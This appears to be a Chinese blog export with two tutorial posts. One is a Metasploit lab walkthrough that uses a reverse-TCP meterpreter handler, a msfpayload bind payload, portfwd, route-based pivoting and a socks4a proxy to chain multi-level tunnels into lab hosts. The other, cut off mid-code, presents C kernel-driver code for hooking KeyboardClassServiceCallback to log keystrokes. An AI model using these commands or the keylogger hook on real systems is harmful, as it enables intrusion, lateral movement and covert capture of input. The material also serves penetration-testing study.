+ -- --=[ 1386 exploits - 863 auxiliary - 236 post        ]
+ -- --=[ 342 payloads - 37 encoders - 8 nops             ]
+ -- --=[ Free Metasploit Pro trial: http://r-7.co/trymsp ]
msf > use exploit/multi/handler 
msf exploit(handler) > set PAYLOAD windows/meterpreter/reverse_tcp
PAYLOAD => windows/meterpreter/reverse_tcp
msf exploit(handler) > set LHOST 0.0.0.0
LHOST => 0.0.0.0
msf exploit(handler) > set LPORT 444
LPORT => 444
msf exploit(handler) > show options 
Module options (exploit/multi/handler):
Name  Current Setting  Required  Description
 ----  ---------------  --------  -----------
Payload options (windows/meterpreter/reverse_tcp):
   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (accepted: seh, thread, process, none)
   LHOST     0.0.0.0          yes       The listen address
   LPORT     444              yes       The listen port
Exploit target:
   Id  Name
   --  ----
   0   Wildcard Target
msf exploit(handler) > run 
[*] Started reverse handler on 0.0.0.0:444 
[*] Starting the payload handler...</pre>
<p>3.在xp-test1执行meter.exe，attacker获得 meterperter</p>
<pre class="prettyprint lang-html prettyprinted">msf exploit(handler) > run 
[*] Started reverse handler on 0.0.0.0:444 
[*] Starting the payload handler...
[*] Sending stage (770048 bytes) to 192.168.101.107
[*] Meterpreter session 1 opened (192.168.101.105:444 -> 192.168.101.107:48019) at 2015-01-11 12:49:11 +0800
meterpreter > ipconfig
Interface  1
============
Name         : MS TCP Loopback interface
Hardware MAC : 00:00:00:00:00:00
MTU          : 1520
IPv4 Address : 127.0.0.1
Interface  2
============
Name         : AMD PCNET Family PCI Ethernet Adapter - pencS
Hardware MAC : 00:0c:29:ed:cf:d0
MTU          : 1500
IPv4 Address : 10.1.1.128
IPv4 Netmask : 255.255.255.0</pre>
<p>0×01 meterpreter基本隧道代理</p>
<p>好，现在已经有一个反弹回来的权限，下面介绍meterpreter隧道代理的几种方法</p>
<p>1.portfwd</p>
<p>portfwd 是meterpreter提供的一种基本的端口转发。porfwd可以反弹单个端口到本地，并且监听.使用方法如下:</p>
<pre class="prettyprint lang-html prettyprinted">meterpreter > portfwd 
0 total local port forwards.
meterpreter > portfwd  -h
Usage: portfwd [-h] [add | delete | list | flush] [args]
OPTIONS:
    -L <opt>  The local host to listen on (optional).
    -h        Help banner.
    -l <opt>  The local port to listen on.
    -p <opt>  The remote port to connect to.
    -r <opt>  The remote host to connect to.</pre>
<p>使用实例介绍：</p>
<p>反弹10.1.1.129端口3389到本地2222并监听那么可以使用如下方法：</p>
<pre class="prettyprint lang-html prettyprinted">meterpreter > portfwd add -l 2222 -r 10.1.1.129 -p 3389
[*] Local TCP relay created: 0.0.0.0:2222 <-> 10.1.1.129:3389
meterpreter > portfwd 
0: 0.0.0.0:2222 -> 10.1.1.129:3389
1 total local port forwards.</pre>
<p>已经转发成功，下面来验证下：</p>
<pre class="prettyprint lang-html prettyprinted">root@kali:~# netstat -an | grep "2222"
tcp        0      0 0.0.0.0:2222            0.0.0.0:*               LISTEN</pre>
<p>可以看到已经成功监听2222端口</p>
<p>接着连接本地2222端口即可连接受害机器10.1.1.129 3389端口，如下：</p>
<pre class="prettyprint lang-html prettyprinted">root@kali:~# rdesktop 127.1.1.0:2222</pre>
<img class="lazy " title="1111.jpg" src="http://www.evil0x.com/wp-content/uploads/2015/01/14212210266496.jpg" alt="" data-original="http://www.evil0x.com/wp-content/uploads/2015/01/14212210266496.jpg" />

<p>可以看到，已经成功连接到10.1.1.129 的3389端口</p>
<ol start="2">
<li>pivot</li>
</ol>
<p>pivot是meterpreter最常用的一种代理，可以轻松把你的机器代理到受害者内网环境，下面介绍下pivot的搭建和使用方法</p>
<p>使用方法route add   目标i或ip段     Netmask 要使用代理的会话，通过实例来说明：</p>
<p>在metasploit添加一个路由表，目的是访问10.1.1.129将通过meterpreter的会话 1 来访问：</p>
<pre class="prettyprint lang-html prettyprinted">msf exploit(handler) > route add 10.1.1.129 255.255.255.255 1
[*] Route added
msf exploit(handler) > route print 
Active Routing Table
====================
   Subnet             Netmask            Gateway
   ------             -------            -------
   10.1.1.129         255.255.255.255    Session 1</pre>
<p>这里如果要代理10.1.1.129/24 到session 1，则可以这么写</p>
<pre class="prettyprint lang-html prettyprinted">route add 10.1.1.0 255.255.255.0 1</pre>
<p>到这里pivot已经配置好了，你在msf里对10.1.1.129进行扫描(db_nmap)或者访问(psexe 模块，ssh模块等)将通过代理session 1这个会话来访问。</p>
<p>如果想通过其他应用程序来使用这个代理怎么办呢，这时候可以借助 metasploit socks4a提供一个监听隧道供其他应用程序访问：</p>
<p>首先使用 socks4a并且配置，监听端口</p>
<pre class="prettyprint lang-html prettyprinted">msf exploit(handler) > use auxiliary/server/socks4a 
msf auxiliary(socks4a) > show options 
Module options (auxiliary/server/socks4a):
   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SRVHOST  0.0.0.0          yes       The address to listen on
   SRVPORT  1080             yes       The port to listen on.
Auxiliary action:
   Name   Description
   ----   -----------
   Proxy  
msf auxiliary(socks4a) > exploit -y
[*] Auxiliary module execution completed
msf auxiliary(socks4a) > 
[*] Starting the socks4a proxy server</pre>
<p>查看监听端口</p>
<pre class="prettyprint lang-html prettyprinted">root@kali:~# netstat -an | grep "1080"
tcp        0      0 0.0.0.0:1080            0.0.0.0:*               LISTEN</pre>
<p>端口已经监听，接着配置 proxychains</p>
<pre class="prettyprint lang-html prettyprinted">root@kali:~# vim /etc/proxychains.conf
[ProxyList]
# add proxy here ...
# meanwileroot@kali:~# netstat -an | grep "1080"
tcp        0      0 0.0.0.0:1080            0.0.0.0:*               LISTEN 
# defaults set to "tor"
socks4  127.0.0.1 1080</pre>
<p>配置好以后看看使用 proxychains进行代理访问，这里访问10.1.1.129 3389端口</p>
<img class="lazy " title="2222.png" src="http://www.evil0x.com/wp-content/uploads/2015/01/1421221055573.png" alt="" data-original="http://www.evil0x.com/wp-content/uploads/2015/01/1421221055573.png" />

<p>可以看到已经成功访问</p>
<p>0×02  多级代理</p>
<ol>
<li>二级代理隧道</li>
</ol>
<p>上面介绍了meterpreter基础的代理方法，但是有些实际环境不能直接使用，考虑如下环境(内网机器A、B。A机器可以对外连接，但是访问控制很严格，只能访问到很少的内网机器，B机器不能对外连接，但是可以访问到很多核心服务和机器，A、B之间可以互相访问)，如果我们想通过B机器对核心服务和机器进行扫描和访问要怎么办呢？</p>
<p>这时候我们就meterpreter的pivot组合轻松实现二级代理就可以</p>
<p>效果示意图:attacker-&gt;xp-test1-&gt;xp-test2</p>
<p>首先接着上面，我们已经有一个xp-test1反弹回来的meterprter了，接着我们生成一个正向的执行文件</p>
<pre class="prettyprint lang-html prettyprinted">root@kali:~# msfpayload windows/meterpreter/bind_tcp  RHOST=0.0.0.0 RPORT=4444 X > Rmeter.exe
[!] ************************************************************************
[!] *               The utility msfpayload is deprecated!                  *
[!] *              It will be removed on or about 2015-06-08               *
[!] *                   Please use msfvenom instead                        *
[!] *  Details: https://github.com/rapid7/metasploit-framework/pull/4333   *
[!] ************************************************************************
Created by msfpayload (http://www.metasploit.com).
Payload: windows/meterpreter/bind_tcp
 Length: 285
Options: {"RHOST"=>"0.0.0.0", "RPORT"=>"4444"}</pre>
<p>生成好以后在xp-test2上面运行</p>
<p>接着在msf里面添加路由</p>
<pre class="prettyprint lang-html prettyprinted">msf exploit(handler) > route add 10.1.1.129 255.255.255.255 2
[*] Route added
msf exploit(handler) > route  print
Active Routing Table
====================
   Subnet             Netmask            Gateway
   ------             -------            -------
   10.1.1.129         255.255.255.255    Session 2</pre>
<p>连接正向 meterpreter获取权限</p>
<pre class="prettyprint lang-html prettyprinted">msf exploit(handler) > use exploit/multi/handler 
msf exploit(handler) > set PAYLOAD windows//bind_tcp
PAYLOAD => windows/meterpreter/bind_tcp
msf exploit(handler) > set RHOST 10.1.1.129
RHOST => 10.1.1.129
msf exploit(handler) > show options 
Module options (exploit/multi/handler):
   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------
Payload options (windows/meterpreter/bind_tcp):
   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (accepted: seh, thread, process, none)
   LPORT     444              yes       The listen port
   RHOST     10.1.1.129       no        The target address
Exploit target:
   Id  Name
   --  ----
   0   Wildcard Target
msf exploit(handler) > set LPORT 4444
LPORT => 4444
msf exploit(handler) > show options 
Module options (exploit/multi/handler):
   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------
Payload options (windows/meterpreter/bind_tcp):
   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (accepted: seh, thread, process, none)
   LPORT     4444             yes       The listen port
   RHOST     10.1.1.129       no        The target address
Exploit target:
   Id  Name
   --  ----
   0   Wildcard Target
msf exploit(handler) > run 
[*] Started bind handler
[*] Starting the payload handler...
[*] Sending stage (770048 bytes)
[*] Meterpreter session 3 opened (192.168.101.105-192.168.101.107:0 -> 10.1.1.129:4444) at 2015-01-11 13:34:37 +0800</pre>
<p>现在已经获取到xp-test2的权限，注意这里是通过xp-test1 pivot代理</p>
<p>下面来验证下，查看xp-test2 4444端口</p>
<pre class="prettyprint lang-html prettyprinted">C:Documents and SettingsAdministrator>netstat -an | find "4444"
  TCP    10.1.1.129:4444        10.1.1.128:1051        ESTABLISHED</pre>
<p>是通过xp-test1进行连接的。</p>
<p>这时候二级代理已经搭建好了，你可以添加需要访问的ip到路由表，通过第二层的session(session 3)，就可以使用metaploit的其他模块访问或扫描了</p>
<p>2.三级或多级代理</p>
<p>有时候过于庞大或者复杂的内网环境，甚至需要三层或者多层代理，原理与两层相似，通过在第二层代理的基础上进行连接既可</p>
<p>示意图：attacket-&gt;xp-test1-&gt;xp-test2-&gt;xp-test3-&gt;…..</p>
<p>与两层代理类似，如下实现：</p>
<pre class="prettyprint lang-html prettyprinted">msf exploit(handler) > sessions -l
Active sessions
===============
  Id  Type                   Information                        Connection
  --  ----                   -----------                        ----------
  2   meterpreter x86/win32  XP-TEST1Administrator @ XP-TEST1  192.168.101.105:444 -> 192.168.101.107:51205 (10.1.1.128)
  4   meterpreter x86/win32  XP-TEST2Administrator @ XP-TEST2  192.168.101.105-192.168.101.107:0 -> 10.1.1.129:4444 (10.1.1.129)
msf exploit(handler) > route  add 10.1.1.131 4
[-] Missing arguments to route add.
msf exploit(handler) > route  add 10.1.1.131 255.255.255.255 4
[*] Route added
msf exploit(handler) > route print 
Active Routing Table
====================
   Subnet             Netmask            Gateway
   ------             -------            -------
   10.1.1.129         255.255.255.255    Session 2
   10.1.1.131         255.255.255.255    Session 4
msf exploit(handler) > set RHOST=10.1.1.131
[-] Unknown variable
Usage: set [option] [value]
Set the given option to value.  If value is omitted, print the current value.
If both are omitted, print options that are currently set.
If run from a module context, this will set the value in the module&amp;#039;s
datastore.  Use -g to operate on the global datastore
msf exploit(handler) > set RHOST 10.1.1.131
RHOST => 10.1.1.131
msf exploit(handler) > show options 
Module options (exploit/multi/handler):
   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------
Payload options (windows/meterpreter/bind_tcp):
   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (accepted: seh, thread, process, none)
   LPORT     4444             yes       The listen port
   RHOST     10.1.1.131       no        The target address
Exploit target:
   Id  Name
   --  ----
   0   Wildcard Target
msf exploit(handler) > run 
[*] Started bind handler
[*] Starting the payload handler...
[*] Sending stage (770048 bytes)
[*] Meterpreter session 5 opened (192.168.101.105-_1_-192.168.101.107:0 -> 10.1.1.131:4444) at 2015-01-11 13:45:53 +0800
meterpreter > background 
[*] Backgrounding session 5...
msf exploit(handler) > sessions -l
Active sessions
===============
  Id  Type                   Information                        Connection
  --  ----                   -----------                        ----------
  2   meterpreter x86/win32  XP-TEST1Administrator @ XP-TEST1  192.168.101.105:444 -> 192.168.101.107:51205 (10.1.1.128)
  4   meterpreter x86/win32  XP-TEST2Administrator @ XP-TEST2  192.168.101.105-192.168.101.107:0 -> 10.1.1.129:4444 (10.1.1.129)
  5   meterpreter x86/win32  XP-TEST3Administrator @ XP-TEST3  192.168.101.105-_1_-192.168.101.107:0 -> 10.1.1.131:4444 (10.1.1.131)
在xp-test3查看端口连接
C:Documents and SettingsAdministrator>netstat -an | find "4444"
  TCP    10.1.1.131:4444        10.1.1.129:1032        ESTABLISHED
在xp-test2查看4444端口
C:Documents and SettingsAdministrator>netstat -an | find "4444"
  TCP    10.1.1.129:1032        10.1.1.131:4444        ESTABLISHED
  TCP    10.1.1.129:4444        10.1.1.128:1054        ESTABLISHED
说明已经实现三级连接，即attacker->xp-test1->xp-test2->xp-test3</pre>
<p>0×03 总结</p>
<p>最后,代理级数越多，带宽损耗和稳定性就会下降。渗透过程中根据实际情况自由灵活的选择和使用代理方式才能实现事半工倍的效果。</p>
<p>&nbsp;</p>
<p>版权属于: FreeBuf<br>原文地址: <a href="http://www.freebuf.com/tools/56432.html" target="_blank" rel="noopener">http://www.freebuf.com/tools/56432.html</a></p>
]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>metasploit</tag>
        <tag>渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>Hook KeyboardClassServiceCallback 实现内核态按键记录和模拟</title>
    <url>/2019/04/02/Hook%20KeyboardClassServiceCallback%20%E5%AE%9E%E7%8E%B0%E5%86%85%E6%A0%B8%E6%80%81%E6%8C%89%E9%94%AE%E8%AE%B0%E5%BD%95%E5%92%8C%E6%A8%A1%E6%8B%9F/</url>
    <content><![CDATA[<h2 id="0x1前言"><a href="#0x1前言" class="headerlink" title="0x1前言"></a>0x1前言</h2><p>这已经是很老的技术了，但是在windows 10 系统中有些东西不太一样了，直接抄《windows内核安全和驱动开发》上的代码并不能直接运行，所以在这里写一下我的学习记录，希望像我一样的新人少走弯路。</p>
<p>才开始学windows驱动相关知识，比较菜，为了搞清楚这个东西还花了2天时间，如果哪里有地方理解的不对，希望大佬能够不吝指教。</p>
<a id="more"></a>

<h2 id="0x2-键盘驱动的工作过程"><a href="#0x2-键盘驱动的工作过程" class="headerlink" title="0x2 键盘驱动的工作过程"></a>0x2 键盘驱动的工作过程</h2><p>KdbClass被称为键盘类驱动，再windows中，类驱动通常是指同一类设备的驱动程序，不管是USB键盘，还是PS/2键盘均使用它，所以在这一层做拦截具有通用性，类驱动之下真正和实际硬件交互的驱动被称为<code>端口驱动</code>，具体到键盘，i8042prt是ps/2的键盘端口驱动，usb键盘驱动是Kbdhid。</p>
<p>键盘驱动的主要工作就是当键盘上有按键按下引发中断时，键盘驱动从端口读出按键的扫描码，最终顺利地将它交给在键盘设备栈栈顶等待的那个主功能号是<code>IRP_MJ_READ</code>的IRP完成任务，为了实现这个功能，键盘驱动使用了两个循环使用的缓冲区。i8042prt和kbdClass各有一个可以循环使用的缓冲区，缓冲区的每个单元都是<code>KEYBOARD_INPUT_DATA</code>结构，用来保存一个扫描码及相关信息。在键盘驱动中，把这个循环使用的缓冲区叫做输入队列（input data queue），i8042prt的那个缓冲区被当作端口键盘输入队列，KdbClass的那个缓冲区被叫做类输入数据队列。</p>
<p>为了使用这个队列，i8042prt驱动生成的设备扩展中也保存着一些指针和计数值：</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span> PKEYBOARD_INPUT_DATA 类型的InputData，DataIn,DataOut,DataEnd</span><br><span class="line"><span class="comment">// InputData 指向输入数据队列的开头</span></span><br><span class="line"><span class="comment">// DataEnd 指向输入数据队列的结尾</span></span><br><span class="line"><span class="comment">// DataIn 指向要进入队列的新数据，被放在队列中的位置</span></span><br><span class="line"><span class="comment">// DataOut 指向出队的数据，被放在队列中的位置</span></span><br><span class="line"><span class="number">2.</span> ULOGN类型的InputCount</span><br><span class="line"><span class="comment">// InputCount 为输入数据队列中数据的个数</span></span><br></pre></td></tr></table></figure>

<p>同时，在KbdClass的自定义设备扩展中，也保存着一些指针和计数值，用来使用它的输入数据队列。名字和类型与上面的数据一样。</p>
<h2 id="0x3-端口驱动和类驱动之间的协调"><a href="#0x3-端口驱动和类驱动之间的协调" class="headerlink" title="0x3 端口驱动和类驱动之间的协调"></a>0x3 端口驱动和类驱动之间的协调</h2><p>当键盘上一个按键被按下时，产生了一个Make code,引发一个键盘中断，当一个按键被松开时产生一个Break Code，引发键盘中断。键盘中断导致键盘中断服务例程被执行，最终导致i8042prt的<code>I8042KeyBoardInterruptService</code>被执行，此函数从端口读出按键的扫描码，放在一个<code>KEYBOARD_INPUT_DATA</code>中，将这个<code>KEYBOARD_INPUT_DATA</code>放在<code>i8042prt</code>的输入数据队列中，一个中断放入一个数据，<code>DataIn</code>后移动一格，<code>InputCount</code>加1，最后会调用内核API函数<code>KeInsertQueueDpc</code>，进行更多处理的延迟过程调用。</p>
<p>在此调用中，会调用上层处理输入的回调函数(也就是KbdClass处理输入数据的函数)，取走i8042prt的输入数据队列中的数据，上层处理输入的回调函数的入口地址放在<code>i8042prt</code>驱动的设备扩展中，取走数据之后，相应的<code>i8042prt</code>的输入数据队列的<code>DataOut</code>相应的后移，<code>InputCount</code>相应的减少。</p>
<p>当读请求要求读的数据大小大于或等于<code>i8042prt</code>输入数据队列的数据时，读请求的处理函数直接从i8042prt的输入数据队列中读出所有输入数据，不使用KbdClass的输入数据队列，大多数情况是这样的。</p>
<p>当读请求要求读的数据大小小于<code>i8042prt</code>输入数据队列的数据时，读请求的处理函数直接从<code>i8042prt</code>的输入数据队列中读出它所要求的大小，然后这个读请求被完成。<code>i8042prt</code>的输入数据队列中剩余的数据会被放入KbdClass的输入数据队列中，当应用层再次发下来一个读请求的时候，那个读请求直接从KbdClass的输入队列中读取数据，不需要等待。</p>
<h2 id="0x4-找到类驱动的回调函数"><a href="#0x4-找到类驱动的回调函数" class="headerlink" title="0x4 找到类驱动的回调函数"></a>0x4 找到类驱动的回调函数</h2><p>从上面的流程可以看出，<code>I8042KeyBoardInterruptService</code>中调用的类驱动的那个回调函数非常关键，通过Hook这个函数，就可以轻易获取到键盘的输入。</p>
<p>这个回调函数的函数指针存储的位置有如下的规律：</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span> 这个函数指针保存在i8042生成的某个设备或者某个设备的过滤设备（设备A）的自定义设备扩展中。</span><br><span class="line"><span class="number">2.</span> 这个函数的开始地址应该在内核模块KdbClass中。</span><br><span class="line"><span class="number">3.</span> 内核模块KdbClass生成的某个设备对象（设备B）指针也保存在那个设备（设备A）的自定义扩展中，而且在我们要找的函数之前。</span><br><span class="line"></span><br><span class="line"><span class="comment">// 第四条是我自己添加的,个人感觉就是这样，但是书上都没说</span></span><br><span class="line"></span><br><span class="line"><span class="number">4.</span> 设备B应该绑定在设备A上，也就是 A-&gt;AttachedDevice == B</span><br></pre></td></tr></table></figure>

<p>根据这四条规则就可以找到回调函数的指针的存储位置。</p>
<p>但是第二条怎么判断是否成立呢？这里说的内核模块不是驱动对象，而是这个内核模块在内核内存空间的地址，其实在驱动对象中<code>DriverStart</code>和<code>DriverSize</code>分别保存着这个驱动对象所代表的内核模块在内存空间中的开始地址和大小。</p>
<p>可以使用下面的简单代码来判断：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">KbdDriverStart = KbdDriverObject-&gt;DriverStart;</span><br><span class="line">	KbdDriverSize = KbdDriverObject-&gt;DriverSize;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((tmp &gt; KbdDriverStart) &amp;&amp; (tmp &lt; (UCHAR*)KbdDriverStart + KbdDriverSize) &amp;&amp;</span><br><span class="line">				(MmIsAddressValid(tmp)))</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="comment">// 在内核模块中  </span></span><br><span class="line">			&#125;</span><br></pre></td></tr></table></figure>

<h2 id="0x5-代码实现"><a href="#0x5-代码实现" class="headerlink" title="0x5 代码实现"></a>0x5 代码实现</h2><p>首先需要先定义需要定义这个回调函数的函数<code>KeyboardClassServiceCallback</code>原型，在MSDN上可以查到：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">VOID</span><span class="params">(__stdcall *KEYBOARDCLASSSERVICECALLBACK)</span><span class="params">( </span></span></span><br><span class="line"><span class="function"><span class="params">	<span class="comment">// KeyboardClassServiceCallback  定义回调函数类型</span></span></span></span><br><span class="line"><span class="function"><span class="params">	</span></span></span><br><span class="line"><span class="function"><span class="params">	<span class="comment">/*</span></span></span></span><br><span class="line"><span class="function"><span class="params"><span class="comment">	https://docs.microsoft.com/en-us/previous-versions//ff542324(v=vs.85)</span></span></span></span><br><span class="line"><span class="function"><span class="params"><span class="comment">	  此回调函数将输入缓冲区的数据传输到类驱动的缓冲队列</span></span></span></span><br><span class="line"><span class="function"><span class="params"><span class="comment">	*/</span></span></span></span><br><span class="line"><span class="function"><span class="params">	_In_    PDEVICE_OBJECT       DeviceObject, </span></span></span><br><span class="line"><span class="function"><span class="params">	_In_    PKEYBOARD_INPUT_DATA InputDataStart, <span class="comment">// Pointer to the first keyboard input data packet in the input data buffer of the port device</span></span></span></span><br><span class="line"><span class="function"><span class="params">	_In_    PKEYBOARD_INPUT_DATA InputDataEnd,</span></span></span><br><span class="line"><span class="function"><span class="params">	<span class="comment">// Pointer to the keyboard input data packet that immediately follows the last data packet in the input data buffer of the port device</span></span></span></span><br><span class="line"><span class="function"><span class="params">	_Inout_ PULONG               InputDataConsumed  <span class="comment">// Pointer to the number of keyboard input data packets that are transferred by the routine</span></span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>

<p>然后需要定义一个自己的数据结构，用来保存回调函数指针和回调函数指针在设备扩展中的位置：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">KBD_CALLBACK</span> &#123;</span></span><br><span class="line">	PDEVICE_OBJECT classDeviceObject;  <span class="comment">// 记录设备B</span></span><br><span class="line">	KEYBOARDCLASSSERVICECALLBACK serviceCallback; <span class="comment">// 记录回调函数的函数指针</span></span><br><span class="line">	PVOID *AddrServiceCallback;  <span class="comment">// 记录回调函数在驱动扩展中存储的位置</span></span><br><span class="line">&#125; KDB_CALLBACK,*PKDB_CALLBACK;</span><br><span class="line"></span><br><span class="line">KDB_CALLBACK gkdbCallback = &#123; <span class="number">0</span> &#125;; <span class="comment">// 全局变量</span></span><br></pre></td></tr></table></figure>

<p>在进行搜索之前，需要先获得KbdClass驱动的驱动对象和端口驱动的驱动对象，用如下代码获得kdbclass的驱动对象：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">extern</span> POBJECT_TYPE *IoDriverObjectType; <span class="comment">// 其实是个指针，书上写错了</span></span><br><span class="line"><span class="comment">// 是一个全局变量，但是头文件没有</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 这个函数是事实存在的，只是文档中没有公开。声明一下</span></span><br><span class="line"><span class="comment">// 就可以直接使用了。</span></span><br><span class="line">NTSTATUS</span><br><span class="line">ObReferenceObjectByName(</span><br><span class="line">	PUNICODE_STRING ObjectName,</span><br><span class="line">	ULONG Attributes,</span><br><span class="line">	PACCESS_STATE AccessState,</span><br><span class="line">	ACCESS_MASK DesiredAccess,</span><br><span class="line">	POBJECT_TYPE ObjectType,</span><br><span class="line">	KPROCESSOR_MODE AccessMode,</span><br><span class="line">	PVOID ParseContext,</span><br><span class="line">	PVOID *Object</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="function">NTSTATUS <span class="title">SearchServiceFromKdbExt</span><span class="params">(PDRIVER_OBJECT KbdDriverObject, PDEVICE_OBJECT pPortDev)</span></span>; </span><br><span class="line"></span><br><span class="line">	<span class="comment">// 获取kdbclass的驱动对象，从里面拿到其开始地址和大小 </span></span><br><span class="line"></span><br><span class="line">	RtlInitUnicodeString(&amp;unitNameString, KBD_DRIVER_NAME); </span><br><span class="line">	status = ObReferenceObjectByName(</span><br><span class="line">		&amp;unitNameString,</span><br><span class="line">		OBJ_CASE_INSENSITIVE,</span><br><span class="line">		<span class="literal">NULL</span>,</span><br><span class="line">		<span class="number">0</span>,</span><br><span class="line">		*IoDriverObjectType,</span><br><span class="line">		KernelMode,</span><br><span class="line">		<span class="literal">NULL</span>,</span><br><span class="line">		&amp;kbdDriverObject</span><br><span class="line">	);</span><br><span class="line">	<span class="keyword">if</span> (!NT_SUCCESS(status)) &#123;</span><br><span class="line">	   <span class="comment">// 如果没有成功，就直接返回失败即可</span></span><br><span class="line">		DbgPrint(<span class="string">"Couldn't get the kbd driver Object!\n"</span>); </span><br><span class="line">		<span class="keyword">return</span> STATUS_UNSUCCESSFUL;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		ObDereferenceObject(kbdDriverObject);</span><br><span class="line"></span><br><span class="line">		<span class="comment">// 记录 kbdclass驱动的起始地址和大小</span></span><br><span class="line">		kbdDriverStart = kbdDriverObject-&gt;DriverStart; </span><br><span class="line">		DbgPrint(<span class="string">"The kbdDriver address is %p\n"</span>,kbdDriverObject);</span><br><span class="line">		kbdDriverSize = kbdDriverObject-&gt;DriverSize;</span><br><span class="line">		DbgPrint(<span class="string">"The kbdDriver size is %d\n"</span>, kbdDriverSize);</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<p>下面就是搜索回调函数的地址了，思路是先找到端口驱动对象，然后遍历它的所有设备对象，对于每一个设备对象都调用一个函数进行搜索：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">UsingDeviceObject = UsingDriverObject-&gt;DeviceObject;</span><br><span class="line"><span class="comment">//UsingDriverObject 是端口驱动对象	</span></span><br><span class="line"><span class="keyword">while</span> (UsingDeviceObject) &#123;</span><br><span class="line">		status = SearchServiceFromKdbExt(kbdDriverObject, UsingDeviceObject);</span><br><span class="line">		<span class="keyword">if</span> (status == STATUS_SUCCESS) &#123;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		UsingDeviceObject = UsingDeviceObject-&gt;NextDevice; <span class="comment">// 遍历设备对象</span></span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<p><code>SearchServiceFromKdbExt</code>函数的实现思路是：先根据第4条，遍历端口驱动的设备对象及绑定在上面的过滤设备对象，先找到设备A。 然后再遍历KdbClass驱动的设备对象，找到设备B。接着根据第三条，找到设备扩展中存储设备B指针的位置，然后根据第1和第2条，找到回调函数的指针及其在设备扩展中的位置。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">NTSTATUS <span class="title">SearchServiceFromKdbExt</span><span class="params">(PDRIVER_OBJECT KbdDriverObject, PDEVICE_OBJECT pPortDev)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	PDEVICE_OBJECT pTargetDeviceObject = <span class="literal">NULL</span>;</span><br><span class="line">	UCHAR *DeviceExt;</span><br><span class="line">	<span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">	NTSTATUS status;</span><br><span class="line">	PVOID KbdDriverStart;</span><br><span class="line">	ULONG KbdDriverSize = <span class="number">0</span>;</span><br><span class="line">	PDEVICE_OBJECT  pTmpDev;</span><br><span class="line">	UNICODE_STRING  kbdDriName;</span><br><span class="line"></span><br><span class="line">	KbdDriverStart = KbdDriverObject-&gt;DriverStart;</span><br><span class="line">	KbdDriverSize = KbdDriverObject-&gt;DriverSize;</span><br><span class="line"></span><br><span class="line">	status = STATUS_UNSUCCESSFUL;</span><br><span class="line"></span><br><span class="line">	RtlInitUnicodeString(&amp;kbdDriName, <span class="string">L"\\Driver\\kbdclass"</span>);</span><br><span class="line">	pTmpDev = pPortDev;</span><br><span class="line">	<span class="keyword">while</span> (pTmpDev-&gt;AttachedDevice != <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		KdPrint((<span class="string">"Att:  0x%x"</span>, pTmpDev-&gt;AttachedDevice));</span><br><span class="line">		KdPrint((<span class="string">"Dri Name : %wZ"</span>, &amp;pTmpDev-&gt;AttachedDevice-&gt;DriverObject-&gt;DriverName));</span><br><span class="line">		<span class="keyword">if</span> (RtlCompareUnicodeString(&amp;pTmpDev-&gt;AttachedDevice-&gt;DriverObject-&gt;DriverName,</span><br><span class="line">			&amp;kbdDriName, TRUE) == <span class="number">0</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		pTmpDev = pTmpDev-&gt;AttachedDevice;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (pTmpDev-&gt;AttachedDevice == <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span> status;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	pTargetDeviceObject = KbdDriverObject-&gt;DeviceObject;</span><br><span class="line">	<span class="keyword">while</span> (pTargetDeviceObject)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (pTmpDev-&gt;AttachedDevice != pTargetDeviceObject)</span><br><span class="line">		&#123;</span><br><span class="line">			pTargetDeviceObject = pTargetDeviceObject-&gt;NextDevice;</span><br><span class="line">			<span class="keyword">continue</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		DeviceExt = (UCHAR *)pTmpDev-&gt;DeviceExtension;</span><br><span class="line">		</span><br><span class="line">		<span class="comment">//遍历我们先找到的端口驱动的设备扩展的每一个指针  </span></span><br><span class="line">		<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">4096</span>; i++, DeviceExt++)</span><br><span class="line">		